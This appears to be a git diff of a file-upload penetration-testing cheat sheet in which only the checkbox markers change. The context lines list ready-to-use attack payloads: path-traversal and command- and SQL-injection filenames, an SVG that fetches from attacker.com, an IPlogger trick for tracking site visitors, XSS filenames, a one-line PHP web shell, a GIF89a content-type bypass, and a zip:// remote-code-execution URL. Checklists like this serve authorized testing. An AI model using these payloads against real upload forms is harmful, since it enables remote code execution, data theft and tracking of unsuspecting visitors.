@@ -120,15 +120,15 @@ file.pHP5
         - `file.`
         - `.html`
     - Vulnerabilities
-        - [ ]  Directory Traversal
+        - ➤  Directory Traversal
             - Set filename `../../etc/passwd/logo.png`
             - Set filename `../../../logo.png` as it might changed the website logo.
-        - [ ]  SQL Injection
+        - ➤  SQL Injection
             - Set filename `'sleep(10).jpg`.
             - Set filename `sleep(10)-- -.jpg`.
-        - [ ]  Command Injection
+        - ➤  Command Injection
             - Set filename `; sleep 10;`
-        - [ ]  SSRF
+        - ➤  SSRF
             - Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
             - SSRF Through `.svg` file.
 
@@ -136,7 +136,7 @@ file.pHP5
             <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
             ```
 
-        - [ ]  ImageTragic
+        - ➤  ImageTragic
 
             ```
             push graphic-context
@@ -145,7 +145,7 @@ file.pHP5
             pop graphic-context
             ```
 
-        - [ ]  XXE
+        - ➤  XXE
             - Upload using `.svg` file
 
             ```xml
@@ -163,7 +163,7 @@ file.pHP5
             ```
 
             - Using excel file
-        - [ ]  XSS
+        - ➤  XSS
             - Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
             - Upload using `.gif` file
 
@@ -189,7 +189,7 @@ file.pHP5
             </svg>
             ```
 
-        - [ ]  Open Redirect
+        - ➤  Open Redirect
             1. Upload using `.svg` file
 
             ```xml
@@ -204,17 +204,17 @@ file.pHP5
             ```
 
     - Content-ish Bypass
-        - [ ]  Content-type validation
+        - ➤  Content-type validation
             - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
             to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
-        - [ ]  Content-Length validation
+        - ➤  Content-Length validation
             - Small PHP Shell
 
             ```php
             (<?=`$_GET[x]`?>)
             ```
 
-        - [ ]  Content Bypass Shell
+        - ➤  Content Bypass Shell
             - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
 
             ```php
@@ -222,12 +222,12 @@ file.pHP5
             ```
 
     - Misc
-        - [ ]  Uploading `file.js` & `file.config` (web.config)
-        - [ ]  Pixel flood attack using image
-        - [ ]  DoS with a large values name: `1234...99.png`
-        - [ ]  Zip Slip
+        - ➤  Uploading `file.js` & `file.config` (web.config)
+        - ➤  Pixel flood attack using image
+        - ➤  DoS with a large values name: `1234...99.png`
+        - ➤  Zip Slip
             - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
-        - [ ]  Image Shell
+        - ➤  Image Shell
             - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`
 
             ```php
